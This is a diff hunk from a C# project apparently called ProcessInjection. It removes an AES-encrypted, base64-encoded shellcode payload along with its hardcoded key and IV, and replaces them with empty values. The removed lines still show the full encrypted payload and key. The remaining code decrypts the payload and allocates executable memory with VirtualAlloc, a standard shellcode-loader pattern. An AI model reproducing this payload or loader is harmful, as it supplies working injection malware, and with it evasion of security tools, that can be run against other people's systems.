@@ -114,9 +114,9 @@ namespace ProcessInjection
                 return;
             }
 
-            string finalPayload = "nU6Ww0TENb5eSxxVpHfmV2Ty2jj16yALa2yq214tGScqBUgzoJoa8U2NXdtMlNuuJ/CAJaY4WQ7fudqL8c9vBifhlxeP+mUxKjnehOCzI6RVXKRUjnAv5d4vPws131LlKGU3SQBQ/Hp2GxrWBLprJsDrEIpFT8QgfrNDw/ZQcnknVI6/r9RVF+GVU7hWdVtjZFhOTjPTEwZmHy0KfhQGL8ZEObibPU3Afs79rGQAShyA8wGo62LWWibWs15LKpwemHlze26bim+Uedkgau9eHLDivVO46lL1vnaR/nNLAz2hpacQrxR2ZZOXUs172qRI8audWCbzzbw7Av6+yEApMHIklB13xvndQ5TFHq7UWMaY3umjZGspuLwbcHRIDkh2rbwlsa9f/8bMyILADTvR/wq9uK+eA21bfvFU2MbJKTB2XPZAXrDhRnSnHYhwor2NlWx9kS8bQ66CDIWHYuJYzdGGO+5x8UfQX4etog6r8bI4S6R0cDrOu+uHr764Bfng7jarjQWeBFb/2no7STd2mjDSFKlAG2CQcInq2KKZWuli0+Y1gdycYjGXmpo/qWkVKA7k21q+JmmJxzF2cAuoaOMo4DdwJrTnM/DUWYsEHJ7i4xG02rTWgthnr7xRbubwZVb90AeFhiKIjBIn30RGe4Lx7BXcLujoMq7ofRnRticEVheqK87tMJ438OgjYioXlf2e7Qs3OI2kv6xoaqHuSApaUQBHUMsMdJb7QUjn7PRDHBW5BzjcmItogkTHjPT2EEM3j1d3skrZwxU3VI+r0hVk4vpel02roQ3L0vsJrk8TjsyVCAUaKyv0LX12IfWGGwN9qgWFmkJBD3P+GT4AfnqSNQnlinzJwKX9y5CDAebhv49lZeetna7psG7APi+9WuR+2wwRbcwbU6/m9Qpn4nqWtOhQzDnaU9LC0MNHZBhv/CSsqnjSiKOYAMolQ9UYfmVN/rIPdIQCfTg/cRhqOYbGtGACLKbhWs4VDePJjjo28MwL5B9M/yS+sR1eampN0og7Dw7r7kMmzXyGSR12oYpySpAGo4xqC6oHnXKLBO8DA+jpf7ioth/Qm3klS8dt4tafTbbeMiguVQbS5HvwcFNeLhxoxUsI9RBKehOq2ih92OeA2WVwVR0Aw+Q7jcoUBCEXhH33IfI+b0vJ135F86t0GkOmjw5hN2B4BozbPkcDc3j2V3zsBs76ARfOsrstQBnzJ1TprxQDtiHhh6VGoA==";
-            byte[] key = new byte[32] { 0xd7, 0xc4, 0xf5, 0x77, 0x60, 0xf2, 0x51, 0x14, 0x79, 0x6a, 0xa3, 0xea, 0xbf, 0x46, 0xba, 0xfd, 0x02, 0x6f, 0x09, 0x32, 0x08, 0x76, 0xfa, 0x3a, 0x5c, 0x96, 0xab, 0x59, 0x76, 0x00, 0x64, 0x97 };
-            byte[] iv = new byte[16] { 0x95, 0xd1, 0xfa, 0x50, 0x4a, 0x56, 0xc2, 0x35, 0x69, 0x32, 0xba, 0xe6, 0x87, 0x1d, 0xd2, 0xf2 };
+            string finalPayload = "";
+            byte[] key = new byte[] {  };
+            byte[] iv = new byte[] {  };
             byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);
 
             IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
